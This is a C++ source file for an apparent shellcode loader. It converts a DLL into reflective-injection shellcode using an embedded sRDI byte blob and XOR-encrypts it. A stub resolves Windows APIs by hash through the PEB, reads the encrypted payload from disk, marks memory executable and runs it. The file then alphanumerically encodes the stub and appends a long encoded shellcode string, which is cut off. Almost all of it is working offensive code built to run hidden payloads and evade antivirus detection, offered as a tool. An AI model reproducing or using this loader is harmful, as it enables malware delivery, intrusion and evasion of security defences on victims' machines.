// RDIShellcodeCLoader.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>
#include <string>
#include "nativeapi.h"
#include<fstream>  
#include<iostream>  
using namespace std;
//º”√‹◊÷Ω⁄**********************
#define PASSWORD 0xcc

#define DEREF_64( name )*(DWORD64 *)(name)
#define DEREF_32( name )*(DWORD *)(name)
#define DEREF_16( name )*(WORD *)(name)
#define DEREF_8( name )*(BYTE *)(name)
#define ROTR32(value, shift)	(((DWORD) value >> (BYTE) shift) | ((DWORD) value << (32 - (BYTE) shift)))

#define SRDI_CLEARHEADER 0x1
#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)

/////////////////////////////////////
#define SRDI_CLEARHEADER 0x1
typedef UINT_PTR(WINAPI * RDI)();
typedef void(WINAPI * Function)();
DWORD get_ntdllbase_peb();
DWORD get_k32base_peb();
DWORD HashFunctionName(LPSTR name);
FARPROC Hash_GetProcAddress(HMODULE hModuleBase, DWORD dwNameHash, PVOID lpGetAddr);
FARPROC GetProcAddressR(UINT_PTR uiLibraryAddress, LPCSTR lpProcName);

void ShellCode(void)
{
	CHAR path[104];
	LPSTR finalShellcode = NULL;
	DWORD dwOldProtect1 = 0;
	SYSTEM_INFO sysInfo;

	HMODULE hModuleBase = (HMODULE)get_k32base_peb();
	HMODULE hNtdllBase = (HMODULE)get_ntdllbase_peb();
	TGetProcAddress xGetProcAddress = (TGetProcAddress)Hash_GetProcAddress(hModuleBase, (DWORD)0xbbafdf85, NULL);
	TCreateFileA xCreateFileA = (TCreateFileA)Hash_GetProcAddress(hModuleBase, (DWORD)0x94e43293, xGetProcAddress);
	TReadFile xReadFile = (TReadFile)Hash_GetProcAddress(hModuleBase, (DWORD)0x130f36b2, xGetProcAddress);
	TGetFileSize xGetFileSize = (TGetFileSize)Hash_GetProcAddress(hModuleBase, (DWORD)0xac0a138e, xGetProcAddress);
	TVirtualAlloc xVirtualAlloc = (TVirtualAlloc)Hash_GetProcAddress(hModuleBase, (DWORD)0x1ede5967, xGetProcAddress);
	TVirtualProtect	xVirtualProtect = (TVirtualProtect)Hash_GetProcAddress(hModuleBase, (DWORD)0xef64a41e, xGetProcAddress);
	TGetNativeSystemInfo xGetNativeSystemInfo = (TGetNativeSystemInfo)Hash_GetProcAddress(hModuleBase, (DWORD)0x8a1fb2a8, xGetProcAddress);
	TGetModuleFileNameA xGetModuleFileNameA = (TGetModuleFileNameA)Hash_GetProcAddress(hModuleBase, (DWORD)0xb4ffafed, xGetProcAddress);
	TExitProcess xExitProcess = (TExitProcess)Hash_GetProcAddress(hModuleBase, (DWORD)0x4fd18963, xGetProcAddress);

	xGetModuleFileNameA(0, path, sizeof(path));
	char *p = path;
	while (*p++)
	{
	}
	while (*p != '\\')
	{
		*(p + 1) = 0;
		*p-- = 'a';
	}


	HANDLE pFile = xCreateFileA(path, GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,        //¥Úø™“—¥Ê‘⁄µƒŒƒº˛ 
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (pFile == INVALID_HANDLE_VALUE)
	{
		return;
	}

	DWORD dwBytesToRead = xGetFileSize(pFile, NULL);          //µ√µΩŒƒº˛µƒ¥Û–°

	finalShellcode = (LPSTR)xVirtualAlloc(NULL, dwBytesToRead, MEM_COMMIT, PAGE_READWRITE);
	xReadFile(pFile, finalShellcode, dwBytesToRead, &dwOldProtect1, NULL);
	dwBytesToRead = (DWORD)finalShellcode + dwBytesToRead;


	while (*finalShellcode++)
	{
	}
	p = finalShellcode;
	do
	{
		*p = *p ^ PASSWORD;
		p++;
	} while ((DWORD)p<dwBytesToRead);
	//char * tmpBuf = finalShellcode;

	//do {                                       //—≠ª∑∂¡Œƒº˛£¨»∑±£∂¡≥ˆÕÍ’˚µƒŒƒº˛    

	//xReadFile(pFile, tmpBuf, dwBytesToRead, &dwBytesRead, NULL);

	//	if (dwBytesRead == 0)
	//		break;

	//	dwBytesToRead -= dwBytesRead;
	//	tmpBuf += dwBytesRead;

	//} while (dwBytesToRead > 0);


	// Only set the first page to RWX
	// This is should sufficiently cover the sRDI shellcode up top
	xGetNativeSystemInfo(&sysInfo);
	if (xVirtualProtect(finalShellcode, sysInfo.dwPageSize, PAGE_EXECUTE_READWRITE, &dwOldProtect1)) {
		RDI rdi = (RDI)(finalShellcode);
		UINT_PTR hLoadedDLL = rdi(); // Excute DLL
									 //xVirtualFree(finalShellcode, 0, MEM_RELEASE); // Free the RDI blob. We no longer need it.
									 //Function exportedFunction = (Function)GetProcAddressR(hLoadedDLL, "SayGoodbye");
									 //if (exportedFunction) {
									 //	printf("[+] Calling exported functon\n");
									 //	exportedFunction();
									 //}
	}
	xExitProcess(0);
}

FARPROC GetProcAddressR(UINT_PTR uiLibraryAddress, LPCSTR lpProcName)
{
	FARPROC fpResult = NULL;

	if (uiLibraryAddress == NULL)
		return NULL;

	UINT_PTR uiAddressArray = 0;
	UINT_PTR uiNameArray = 0;
	UINT_PTR uiNameOrdinals = 0;
	PIMAGE_NT_HEADERS pNtHeaders = NULL;
	PIMAGE_DATA_DIRECTORY pDataDirectory = NULL;
	PIMAGE_EXPORT_DIRECTORY pExportDirectory = NULL;

	// get the VA of the modules NT Header
	pNtHeaders = (PIMAGE_NT_HEADERS)(uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew);

	pDataDirectory = (PIMAGE_DATA_DIRECTORY)&pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

	// get the VA of the export directory
	pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(uiLibraryAddress + pDataDirectory->VirtualAddress);

	// get the VA for the array of addresses
	uiAddressArray = (uiLibraryAddress + pExportDirectory->AddressOfFunctions);

	// get the VA for the array of name pointers
	uiNameArray = (uiLibraryAddress + pExportDirectory->AddressOfNames);

	// get the VA for the array of name ordinals
	uiNameOrdinals = (uiLibraryAddress + pExportDirectory->AddressOfNameOrdinals);

	// test if we are importing by name or by ordinal...
	if (((DWORD)lpProcName & 0xFFFF0000) == 0x00000000)
	{
		// import by ordinal...

		// use the import ordinal (- export ordinal base) as an index into the array of addresses
		uiAddressArray += ((IMAGE_ORDINAL((DWORD)lpProcName) - pExportDirectory->Base) * sizeof(DWORD));

		// resolve the address for this imported function
		fpResult = (FARPROC)(uiLibraryAddress + DEREF_32(uiAddressArray));
	}
	else
	{
		// import by name...
		DWORD dwCounter = pExportDirectory->NumberOfNames;
		while (dwCounter--)
		{
			char * cpExportedFunctionName = (char *)(uiLibraryAddress + DEREF_32(uiNameArray));

			// test if we have a match...
			if (strcmp(cpExportedFunctionName, lpProcName) == 0)
			{
				// use the functions name ordinal as an index into the array of name pointers
				uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));

				// calculate the virtual address for the function
				fpResult = (FARPROC)(uiLibraryAddress + DEREF_32(uiAddressArray));

				// finish...
				break;
			}

			// get the next exported function name
			uiNameArray += sizeof(DWORD);

			// get the next exported function name ordinal
			uiNameOrdinals += sizeof(WORD);
		}
	}

	return fpResult;
}



DWORD HashFunctionName(LPSTR name) {
	DWORD hash = 0;

	do
	{
		hash = ROTR32(hash, 13);
		hash += *name;
		name++;
	} while (*(name - 1) != 0);

	return hash;
}

__declspec(naked) DWORD get_ntdllbase_peb()
{
	__asm
	{
		mov   eax, fs:[030h];
		test  eax, eax;
		js    finished;
		mov   eax, [eax + 0ch];
		mov   eax, [eax + 14h];
		mov   eax, [eax];
		mov   eax, [eax + 10h]
			finished:
		ret
	}
}
__declspec(naked) DWORD get_k32base_peb()
{
	__asm
	{
		mov   eax, fs:[030h];
		test  eax, eax;
		js    finished;
		mov   eax, [eax + 0ch];
		mov   eax, [eax + 14h];
		mov   eax, [eax];
		mov   eax, [eax]
			mov   eax, [eax + 10h]
			finished:
		ret
	}
}
DWORD GetRolHash(char *lpszBuffer)
{
	DWORD dwHash = 0;
	while (*lpszBuffer)
	{
		//		dwHash = ((dwHash << 3) & 0xFFFFFFFF) | (dwHash >> (32 - 3)) ^ (DWORD)(*lpszBuffer);
		dwHash = ((dwHash << 25) | (dwHash >> 7));
		dwHash = dwHash + *lpszBuffer;
		lpszBuffer++;
	}
	return dwHash;
}

FARPROC Hash_GetProcAddress(HMODULE hModuleBase, DWORD dwNameHash, PVOID lpGetAddr)
{
	FARPROC							pRet = NULL;
	TGetProcAddress 				xGetProcAddress;
	PIMAGE_DOS_HEADER				lpDosHeader;
	PIMAGE_NT_HEADERS32				lpNtHeaders;
	PIMAGE_EXPORT_DIRECTORY			lpExports;
	PWORD							lpwOrd;
	PDWORD							lpdwFunName;
	PDWORD							lpdwFunAddr;
	DWORD							dwLoop;
	//ºÏ≤ÈDOS µƒMZÕ∑ «≤ª «4D5A
	lpDosHeader = (PIMAGE_DOS_HEADER)hModuleBase;
	if (lpDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return pRet;

	//ªÒ»°PEŒƒº˛Õ∑µƒ÷∏’Î
	lpNtHeaders = (PIMAGE_NT_HEADERS)((DWORD)hModuleBase + lpDosHeader->e_lfanew);

	//ºÏ≤ÈPEµƒ±Í÷æ PEÕ∑ «≤ª «4550
	if (lpNtHeaders->Signature != IMAGE_NT_SIGNATURE) return pRet;

	//”√DWORD «ø÷∆◊™ªªœ¬ √‚µ√ ≤ª»√÷∏’Îœ‡º”
	if (!lpNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size) return pRet;
	if (!lpNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress) return pRet;

	//ªÒµ√kernel32.dllµƒµº≥ˆ±ÌµƒVA  VA=IB+RVA
	lpExports = (PIMAGE_EXPORT_DIRECTORY)((DWORD)hModuleBase + (DWORD)lpNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	//»Áπ˚√ª”–∫Ø ˝“‘√˚◊÷µº≥ˆæÕ ß∞‹¡À
	if (!lpExports->NumberOfNames) return pRet;

	//÷∏œÚ∫Ø ˝√˚◊÷∑˚¥Æµÿ÷∑±Ì  «“ª∏ˆdword ˝◊È  ˝◊È÷–µƒ√ø“ªœÓ÷∏œÚ“ª∏ˆ∫Ø ˝√˚≥∆◊÷∑˚¥ÆµƒRVA
	// ˝◊ÈµƒœÓ ˝µ»”⁄NumberOfNames◊÷∂Œµƒ÷µ   
	lpdwFunName = (PDWORD)((DWORD)hModuleBase + (DWORD)lpExports->AddressOfNames);

	//÷∏œÚ“ª∏ˆword¿‡–Õµƒ ˝◊È  ˝◊ÈœÓƒø”Î AddressOfNames÷–µƒ ˝◊È“ª“ª∂‘”¶ œÓƒø÷µ¥˙±Ì∫Ø ˝»Îø⁄µÿ÷∑±ÌµƒÀ˜“˝
	lpwOrd = (PWORD)((DWORD)hModuleBase + (DWORD)lpExports->AddressOfNameOrdinals);

	//“ª∏ˆrva÷µ ÷∏œÚ∞¸∫¨»´≤øµº≥ˆ∫Ø ˝»Îø⁄µÿ÷∑µƒdword ˝◊È  ˝◊È÷–µƒ√ø“ªœÓ∂º «“ª∏ˆrva÷µ
	// ˝◊ÈµƒœÓ ˝µ»”⁄NumberOfFunctions◊÷∂Œµƒ÷µ
	lpdwFunAddr = (PDWORD)((DWORD)hModuleBase + (DWORD)lpExports->AddressOfFunctions);

	for (dwLoop = 0; dwLoop<lpExports->NumberOfNames - 1; dwLoop++)
	{


		if (GetRolHash((char *)(lpdwFunName[dwLoop] + (DWORD)hModuleBase)) == dwNameHash)
		{
			if (lpGetAddr)
			{
				xGetProcAddress = (TGetProcAddress)lpGetAddr;
				//	pRet = xGetProcAddress(hModuleBase, (char *)(lpwOrd[dwLoop] + (DWORD)lpExports->Base));//’‚¿Ô «Õ®π˝ordinal¿¥»°∫Ø ˝µÿ÷∑
				pRet = xGetProcAddress(hModuleBase, (char *)((lpdwFunName[dwLoop] + (DWORD)hModuleBase)));//’‚¿Ô «Õ®π˝∫Ø ˝√˚◊÷¿¥»°∫Ø ˝µÿ÷∑
			}
			else
			{
				pRet = (FARPROC)(lpdwFunAddr[lpwOrd[dwLoop]] + (DWORD)hModuleBase);
			}
			break;
		}
	}
	return pRet;
}
void __declspec(naked) EndSign() {}


BOOL Is64BitDLL(UINT_PTR uiLibraryAddress)
{
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew);

	if (pNtHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) return true;
	else return false;
}

DWORD GetFileContents(LPCSTR filename, LPSTR *data, DWORD &size)
{
	std::FILE *fp = std::fopen(filename, "rb");

	if (fp)
	{
		fseek(fp, 0, SEEK_END);
		size = ftell(fp);
		fseek(fp, 0, SEEK_SET);

		*data = (LPSTR)malloc(size + 1);
		fread(*data, size, 1, fp);
		fclose(fp);
		return true;
	}
	return false;
}



BOOL ConvertToShellcode(LPVOID inBytes, DWORD length, DWORD userFunction, LPVOID userData, DWORD userLength, DWORD flags, LPSTR &outBytes, DWORD &outLength)
{

	LPSTR rdiShellcode = NULL;
	DWORD rdiShellcodeLength, dllOffset, userDataLocation;


	LPSTR rdiShellcode32 = "\x83\xEC\x48\x83\x64\x24\x18\x00\xB9\x4C\x77\x26\x07\x53\x55\x56\x57\x33\xF6\xE8\x22\x04\x00\x00\xB9\x49\xF7\x02\x78\x89\x44\x24\x1C\xE8\x14\x04\x00\x00\xB9\x58\xA4\x53\xE5\x89\x44\x24\x20\xE8\x06\x04\x00\x00\xB9\x10\xE1\x8A\xC3\x8B\xE8\xE8\xFA\x03\x00\x00\xB9\xAF\xB1\x5C\x94\x89\x44\x24\x2C\xE8\xEC\x03\x00\x00\xB9\x33\x00\x9E\x95\x89\x44\x24\x30\xE8\xDE\x03\x00\x00\x8B\xD8\x8B\x44\x24\x5C\x8B\x78\x3C\x03\xF8\x89\x7C\x24\x10\x81\x3F\x50\x45\x00\x00\x74\x07\x33\xC0\xE9\xB8\x03\x00\x00\xB8\x4C\x01\x00\x00\x66\x39\x47\x04\x75\xEE\xF6\x47\x38\x01\x75\xE8\x0F\xB7\x57\x06\x0F\xB7\x47\x14\x85\xD2\x74\x22\x8D\x4F\x24\x03\xC8\x83\x79\x04\x00\x8B\x01\x75\x05\x03\x47\x38\xEB\x03\x03\x41\x04\x3B\xC6\x0F\x47\xF0\x83\xC1\x28\x83\xEA\x01\x75\xE3\x8D\x44\x24\x34\x50\xFF\xD3\x8B\x44\x24\x38\x8B\x5F\x50\x8D\x50\xFF\x8D\x48\xFF\xF7\xD2\x48\x03\xCE\x03\xC3\x23\xCA\x23\xC2\x3B\xC1\x75\x97\x6A\x04\x68\x00\x30\x00\x00\x53\x6A\x00\xFF\xD5\x8B\x77\x54\x8B\xD8\x8B\x44\x24\x5C\x33\xC9\x89\x44\x24\x14\x8B\xD3\x33\xC0\x89\x5C\x24\x18\x40\x89\x44\x24\x24\x85\xF6\x74\x37\x8B\x6C\x24\x6C\x8B\x5C\x24\x14\x23\xE8\x4E\x85\xED\x74\x19\x8B\xC7\x2B\x44\x24\x5C\x3B\xC8\x73\x0F\x83\xF9\x3C\x72\x05\x83\xF9\x3E\x76\x05\xC6\x02\x00\xEB\x04\x8A\x03\x88\x02\x41\x43\x42\x85\xF6\x75\xD7\x8B\x5C\x24\x18\x0F\xB7\x47\x06\x0F\xB7\x4F\x14\x85\xC0\x74\x38\x83\xC7\x2C\x03\xCF\x8B\x7C\x24\x5C\x8B\x51\xF8\x48\x8B\x31\x03\xD3\x8B\x69\xFC\x03\xF7\x89\x44\x24\x5C\x85\xED\x74\x0F\x8A\x06\x88\x02\x42\x46\x83\xED\x01\x75\xF5\x8B\x44\x24\x5C\x83\xC1\x28\x85\xC0\x75\xD5\x8B\x7C\x24\x10\x8B\xB7\x80\x00\x00\x00\x03\xF3\x89\x74\x24\x14\x8B\x46\x0C\x85\xC0\x74\x7D\x03\xC3\x50\xFF\x54\x24\x20\x8B\x6E\x10\x8B\xF8\x8B\x06\x03\xEB\x03\xC3\x89\x44\x24\x5C\x83\x7D\x00\x00\x74\x4F\x8B\x74\x24\x20\x8B\x08\x85\xC9\x74\x1E\x79\x1C\x8B\x47\x3C\x0F\xB7\xC9\x8B\x44\x38\x78\x2B\x4C\x38\x10\x8B\x44\x38\x1C\x8D\x04\x88\x8B\x04\x38\x03\xC7\xEB\x0C\x8B\x45\x00\x83\xC0\x02\x03\xC3\x50\x57\xFF\xD6\x89\x45\x00\x83\xC5\x04\x8B\x44\x24\x5C\x83\xC0\x04\x89\x44\x24\x5C\x83\x7D\x00\x00\x75\xB9\x8B\x74\x24\x14\x8B\x46\x20\x83\xC6\x14\x89\x74\x24\x14\x85\xC0\x75\x87\x8B\x7C\x24\x10\x8B\xEB\x2B\x6F\x34\x83\xBF\xA4\x00\x00\x00\x00\x0F\x84\xAA\x00\x00\x00\x8B\x97\xA0\x00\x00\x00\x03\xD3\x89\x54\x24\x5C\x8D\x4A\x04\x8B\x01\x89\x4C\x24\x14\x85\xC0\x0F\x84\x8D\x00\x00\x00\x8B\x32\x8D\x78\xF8\x03\xF3\x8D\x42\x08\xD1\xEF\x89\x44\x24\x20\x74\x60\x6A\x02\x8B\xD8\x5A\x0F\xB7\x0B\x4F\x66\x8B\xC1\x66\xC1\xE8\x0C\x66\x83\xF8\x0A\x74\x06\x66\x83\xF8\x03\x75\x0B\x81\xE1\xFF\x0F\x00\x00\x01\x2C\x31\xEB\x27\x66\x3B\x44\x24\x24\x75\x11\x81\xE1\xFF\x0F\x00\x00\x8B\xC5\xC1\xE8\x10\x66\x01\x04\x31\xEB\x0F\x66\x3B\xC2\x75\x0A\x81\xE1\xFF\x0F\x00\x00\x66\x01\x2C\x31\x03\xDA\x85\xFF\x75\xB1\x8B\x5C\x24\x18\x8B\x54\x24\x5C\x8B\x4C\x24\x14\x03\x11\x89\x54\x24\x5C\x8D\x4A\x04\x8B\x01\x89\x4C\x24\x14\x85\xC0\x0F\x85\x77\xFF\xFF\xFF\x8B\x7C\x24\x10\x0F\xB7\x47\x06\x0F\xB7\x4F\x14\x85\xC0\x0F\x84\xB7\x00\x00\x00\x8B\x74\x24\x5C\x8D\x6F\x3C\x03\xE9\x48\x83\x7D\xEC\x00\x89\x44\x24\x24\x0F\x86\x94\x00\x00\x00\x8B\x4D\x00\x33\xD2\x42\x8B\xC1\xC1\xE8\x1D\x23\xC2\x8B\xD1\xC1\xEA\x1E\x83\xE2\x01\xC1\xE9\x1F\x85\xC0\x75\x18\x85\xD2\x75\x07\x6A\x08\x5E\x6A\x01\xEB\x05\x6A\x04\x5E\x6A\x02\x85\xC9\x58\x0F\x44\xF0\xEB\x2C\x85\xD2\x75\x17\x85\xC9\x75\x04\x6A\x10\xEB\x15\x85\xD2\x75\x0B\x85\xC9\x74\x18\xBE\x80\x00\x00\x00\xEB\x11\x85\xC9\x75\x05\x6A\x20\x5E\xEB\x08\x6A\x40\x85\xC9\x58\x0F\x45\xF0\x8B\x4D\x00\x8B\xC6\x0D\x00\x02\x00\x00\x81\xE1\x00\x00\x00\x04\x0F\x44\xC6\x8B\xF0\x8D\x44\x24\x28\x50\x8B\x45\xE8\x56\xFF\x75\xEC\x03\xC3\x50\xFF\x54\x24\x3C\x85\xC0\x0F\x84\xEC\xFC\xFF\xFF\x8B\x44\x24\x24\x83\xC5\x28\x85\xC0\x0F\x85\x52\xFF\xFF\xFF\x8B\x77\x28\x6A\x00\x6A\x00\x6A\xFF\x03\xF3\xFF\x54\x24\x3C\x33\xC0\x40\x50\x50\x53\xFF\xD6\x83\x7C\x24\x60\x00\x74\x7C\x83\x7F\x7C\x00\x74\x76\x8B\x4F\x78\x03\xCB\x8B\x41\x18\x85\xC0\x74\x6A\x83\x79\x14\x00\x74\x64\x8B\x69\x20\x8B\x79\x24\x03\xEB\x83\x64\x24\x5C\x00\x03\xFB\x85\xC0\x74\x51\x8B\x75\x00\x03\xF3\x33\xD2\x0F\xBE\x06\xC1\xCA\x0D\x03\xD0\x46\x80\x7E\xFF\x00\x75\xF1\x39\x54\x24\x60\x74\x16\x8B\x44\x24\x5C\x83\xC5\x04\x40\x83\xC7\x02\x89\x44\x24\x5C\x3B\x41\x18\x72\xD0\xEB\x1F\x0F\xB7\x17\x83\xFA\xFF\x74\x17\x8B\x41\x1C\xFF\x74\x24\x68\xFF\x74\x24\x68\x8D\x04\x90\x8B\x04\x18\x03\xC3\xFF\xD0\x59\x59\x8B\xC3\x5F\x5E\x5D\x5B\x83\xC4\x48\xC3\x83\xEC\x10\x64\xA1\x30\x00\x00\x00\x53\x55\x56\x8B\x40\x0C\x57\x89\x4C\x24\x18\x8B\x70\x0C\xE9\x8A\x00\x00\x00\x8B\x46\x30\x33\xC9\x8B\x5E\x2C\x8B\x36\x89\x44\x24\x14\x8B\x42\x3C\x8B\x6C\x10\x78\x89\x6C\x24\x10\x85\xED\x74\x6D\xC1\xEB\x10\x33\xFF\x85\xDB\x74\x1F\x8B\x6C\x24\x14\x8A\x04\x2F\xC1\xC9\x0D\x3C\x61\x0F\xBE\xC0\x7C\x03\x83\xC1\xE0\x03\xC8\x47\x3B\xFB\x72\xE9\x8B\x6C\x24\x10\x8B\x44\x2A\x20\x33\xDB\x8B\x7C\x2A\x18\x03\xC2\x89\x7C\x24\x14\x85\xFF\x74\x31\x8B\x28\x33\xFF\x03\xEA\x83\xC0\x04\x89\x44\x24\x1C\x0F\xBE\x45\x00\xC1\xCF\x0D\x03\xF8\x45\x80\x7D\xFF\x00\x75\xF0\x8D\x04\x0F\x3B\x44\x24\x18\x74\x20\x8B\x44\x24\x1C\x43\x3B\x5C\x24\x14\x72\xCF\x8B\x56\x18\x85\xD2\x0F\x85\x6B\xFF\xFF\xFF\x33\xC0\x5F\x5E\x5D\x5B\x83\xC4\x10\xC3\x8B\x74\x24\x10\x8B\x44\x16\x24\x8D\x04\x58\x0F\xB7\x0C\x10\x8B\x44\x16\x1C\x8D\x04\x88\x8B\x04\x10\x03\xC2\xEB\xDB";
	DWORD rdiShellcode32Length = 1298;




	rdiShellcode = rdiShellcode32;
	rdiShellcodeLength = rdiShellcode32Length;

	if (rdiShellcode == NULL || rdiShellcodeLength == 0) return 0;

	BYTE bootstrap[45] = { 0 };
	DWORD i = 0;

	// call next instruction (Pushes next instruction address to stack)
	bootstrap[i++] = 0xe8;
	bootstrap[i++] = 0x00;
	bootstrap[i++] = 0x00;
	bootstrap[i++] = 0x00;
	bootstrap[i++] = 0x00;

	// Set the offset to our DLL from pop result
	dllOffset = sizeof(bootstrap) - i + rdiShellcodeLength;

	// pop eax - Capture our current location in memory
	bootstrap[i++] = 0x58;

	// mov ebx, eax - copy our location in memory to ebx before we start modifying eax
	bootstrap[i++] = 0x89;
	bootstrap[i++] = 0xc3;

	// add eax, <Offset to the DLL>
	bootstrap[i++] = 0x05;
	MoveMemory(bootstrap + i, &dllOffset, sizeof(dllOffset));
	i += sizeof(dllOffset);

	// add ebx, <Offset to the DLL> + <Size of DLL>
	bootstrap[i++] = 0x81;
	bootstrap[i++] = 0xc3;
	userDataLocation = dllOffset + length;
	MoveMemory(bootstrap + i, &userDataLocation, sizeof(userDataLocation));
	i += sizeof(userDataLocation);

	// push <Flags>
	bootstrap[i++] = 0x68;
	MoveMemory(bootstrap + i, &flags, sizeof(flags));
	i += sizeof(flags);

	// push <Length of User Data>
	bootstrap[i++] = 0x68;
	MoveMemory(bootstrap + i, &userLength, sizeof(userLength));
	i += sizeof(userLength);

	// push ebx
	bootstrap[i++] = 0x53;

	// push <hash of function>
	bootstrap[i++] = 0x68;
	MoveMemory(bootstrap + i, &userFunction, sizeof(userFunction));
	i += sizeof(userFunction);

	// push eax
	bootstrap[i++] = 0x50;

	// call - Transfer execution to the RDI
	bootstrap[i++] = 0xe8;
	bootstrap[i++] = sizeof(bootstrap) - i - 4; // Skip the remainder of instructions
	bootstrap[i++] = 0x00;
	bootstrap[i++] = 0x00;
	bootstrap[i++] = 0x00;

	// add esp, 0x14 - correct the stack pointer
	bootstrap[i++] = 0x83;
	bootstrap[i++] = 0xc4;
	bootstrap[i++] = 0x14;

	// ret - return to caller
	bootstrap[i++] = 0xc3;

	// Ends up looking like this in memory:
	// Bootstrap shellcode
	// RDI shellcode
	// DLL bytes
	// User data
	outLength = length + userLength + rdiShellcodeLength + sizeof(bootstrap);
	outBytes = (LPSTR)malloc(outLength);
	MoveMemory(outBytes, bootstrap, sizeof(bootstrap));
	MoveMemory(outBytes + sizeof(bootstrap), rdiShellcode, rdiShellcodeLength);
	MoveMemory(outBytes + sizeof(bootstrap) + rdiShellcodeLength, inBytes, length);
	MoveMemory(outBytes + sizeof(bootstrap) + rdiShellcodeLength + length, userData, userLength);

	return true;
}

typedef UINT_PTR(WINAPI * RDI)();
typedef void(WINAPI * Function)();
typedef BOOL(__cdecl * EXPORTEDFUNCTION)(LPVOID, DWORD);




int main(int argc, char *argv[], char *envp[])
{
	LPSTR finalShellcode = NULL, data = NULL;
	DWORD finalSize, dataSize;


	if (argc <2) {
		printf("\n[!] Usage:\n\n\tNativeLoader.exe <DLL File>\n\tNativeLoader.exe <Shellcode Bin>\n");
		return 0;
	}

	if (!GetFileContents(argv[1], &data, dataSize)) {
		printf("\n[!] Failed to load file\n");
		return 0;
	}

	//º”√‹dll
	if (data[0] == 'M' && data[1] == 'Z') {
		printf("[+] File is a DLL, attempting to convert\n");

		if (!ConvertToShellcode(data, dataSize, HashFunctionName("SayHello"), "dave", 5, SRDI_CLEARHEADER, finalShellcode, finalSize)) {
			printf("[!] Failed to convert DLL\n");
			return 0;
		}

		printf("[+] Successfully Converted\n");
		PBYTE p = (PBYTE)finalShellcode;
		for (size_t i = 0; i < finalSize; i++)
		{
			*p ^= PASSWORD;
			p++;
		}
		printf("[+] Successfully use pssword\n");

	}
	else {
		printf("\n[!] Dll file pe erro\n");
		return 0;
	}

	//º”‘ÿ¥Ûshell
	DWORD ShellCodeSize = (DWORD)EndSign - (DWORD)ShellCode;
	PBYTE evil = new BYTE[ShellCodeSize];
	RtlCopyMemory(evil, (BYTE *)ShellCode, ShellCodeSize);


	char* szShellCode = new char[8192];
	RtlZeroMemory(szShellCode, sizeof(szShellCode));

	char* valid_chars = "0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	char* edi = "3 -r wootwootWYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI"; //wootwoot∂®Œª◊÷∑˚, edi÷∏œÚshellÕ∑…Ë∂®
	RtlCopyMemory(szShellCode, edi, strlen(edi));

	char*p = szShellCode + strlen(edi);

	int   input, A, B, C, D, E, F;

	int   unicode = 0;
	for (int j = 0; j<ShellCodeSize; j++)//∂‘ º”‘ÿpeº”√‹shellµƒload shell Ω¯––◊÷∑˚¥ÆªØ
	{
		input = evil[j];
		A = (input & 0xf0) >> 4;
		B = (input & 0x0f);

		F = B;
		int i = rand() % strlen(valid_chars);
		while ((valid_chars[i] & 0x0f) != F) { i = ++i % strlen(valid_chars); }
		E = valid_chars[i] >> 4;
		D = unicode ? (A - E) & 0x0f : (A^E);
		i = rand() % strlen(valid_chars);
		while ((valid_chars[i] & 0x0f) != D) { i = ++i % strlen(valid_chars); }
		C = valid_chars[i] >> 4;
		*p++ = (C << 4) + D;
		*p++ = (E << 4) + F;
	}


	char* szconst = "";
	printf("%s\n\n", szShellCode);//º”‘ÿpeº”√‹shellµƒload shell(◊÷∑˚¥Æ–Œ Ω)
	delete[]evil;
	strcat(szShellCode,
		"3 -r wootwootWYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIQELKJLMQZLY0EQUPUPPSPVPW9V75ZX3SIVW5ZYFNO6QUZZ2DYVQUKK2BK0E5KL5PHFLE8LKNKOKO1SYVMU8MKNKOKO42O6MUXNKNKOKOSUXFK5HOKNKOKOCQHFK5N0KNKOKOD4O6LEN1KNKOKO3UHFLEHRKNKOKOPFO6K5XSKNKOKOBIO6LEHTKNKOKORLXFMUYEKNKOKOSU9VMU8VKNKOKOQQMPOUIGKNKOKOEP9VMUNTKNKOKOW7YVK5OEKNKOKO2EIVLENVKNKOKORTO6LEH7KNKOKOPMYVMUNXKNKOKO2OYVMUNYKNKOKO2DO6MUNZKNKOKO3E9VK5OKKNKOKORLO6K5OLKNKOKOREYVLEOMKNKOKOQVO6K5ONKNKOKORIYVK5OOKNKOKO2LO6MUYPKNKOKOU58FLEYQKNKOKOPNXFK59RKNKOKOU1XFMUO3KNKOKO2MYVMUO4KNKOKOCU8FK5XEKNKOKO1QK0NEXFKNKOKOEPHFMUNDKNKOKO2LO6K5Y5KNKOKOCCO6MUOVKNKOKOSDO6LE97KNKOKOBRYVMUNHKNKOKO53YVLE99KNKOKO3QYVK5OZKNKOKO44O6K5NKKNKOKOQQMPI5NLKNKOKO5PXFMUJ0KNKOKOQFYVLELQKNKOKO3YO6MULRKNKOKO42XFMULSKNKOKO44XFMUMDKNKOKO3EXFK5Z5KNKOKOCQO6MUZ6KNKOKO2L8FLELWKNKOKOW1YVK5Z8KNKOKO2LYVLELYKNKOKO2LYVK5LZKNKOKOBOO6MUMKKNKOKO2CK0NEMLKNKOKOS09VMUSLKNKOKOF2O6MU3MKNKOKO2E9VLE3NKNKOKOU1YVMU3OKNKOKOE4O6MUK0KNKOKO1VO6MUK1KNKOKOSY9VLELBKNKOKORLYVK5K3KNKOKO2EMPOUMTKNKOKO30O6LERHKNKO